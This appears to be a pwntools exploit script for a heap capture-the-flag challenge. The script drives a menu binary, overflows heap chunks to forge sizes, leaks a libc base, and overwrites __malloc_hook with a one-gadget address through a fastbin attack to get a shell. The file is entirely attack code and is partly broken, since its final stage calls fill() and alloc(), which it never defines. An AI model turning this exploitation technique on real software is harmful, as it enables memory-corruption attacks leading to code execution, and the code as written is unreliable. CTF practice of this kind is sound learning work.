#/lib/x86_64-linux-gnu/libc.so.6
#!/usr/bin/env python
#-*- coding:utf-8 -*-
from pwn import *

DEBUG = True
context.log_level = "debug"
if DEBUG:
	io = process("./pwn")
	elf = ELF("./pwn")
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def change(index,size,content):
	io.sendlineafter("Your choice:","3")
	io.sendlineafter("Please enter the index of servant:",str(index))
	io.sendlineafter("Please enter the length of servant name:",str(size))
	io.sendlineafter("Please enter the new name of the servnat:",content)

def Add(size,content):
	io.sendlineafter("Your choice:","2")
	io.sendlineafter("Please enter the length of servant name:",str(size))
	io.sendafter("Please enter the name of servant:",content)

def free(index):
	io.sendlineafter("Your choice:","4")
	io.sendlineafter("Please enter the index of servant:",str(index))

def dump():
	io.sendlineafter("Your choice:","1")
	return io.recvline()

def leak():
	Add(0x16,p64(elf.got["malloc"]))
	dump()
	Add(0x60,0x60*"a")
	Add(0x40,0x40*"a")
	change(0,0x60+0x10,"a"*0x60+p64(0)+p64(0x71))
	#print dump()
	Add(0x100,0x100*"a")
	change(2,0x20,"a"*0x10+p64(0)+p64(0x31))
	free(1)
	Add(0x60,0x60*"a")
	change(1,0x40+0x10,"a"*0x40+p64(0)+p64(0x111))
	Add(0x50,0x50*"a")
	free(2)
	#change(1,0x40+0x12,"a"*0x40+"a"*0x12)
	leaked = u64(dump()[-8:])
	offset = 0x7f8f9755ab58-0x7f8f971c3000
	print hex(leaked)
	log.info("get libc_base:" + hex(leaked - offset))
	return leaked - offset

def fastbinattack(libc_base):
	malloc_hook = libc.symbols['__malloc_hook'] + libc_base
	system_addr = libc.symbols['system'] + libc_base
	log.info("malloc_hook @" + hex(malloc_hook))
	log.info("system_addr @" + hex(system_addr))
	free(1)
	fill(0, 0x60 + 0x10 + 0x10, 'a' * 0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 27 - 0x8) + p64(0))
	alloc(0x60)

    # free_hook
	alloc(0x60)
    #                   memalign_hook     realloc_hook      malloc hook
	payload = 3 * 'a' + p64(0)          + p64(0)        + p64(libc_base + 0x3f35a)
	fill(2, len(payload), payload)
	alloc(0x20)
gdb.attach(io,"b *0x000000000040093C")
fastbinattack(leak())
io.interactive()
	
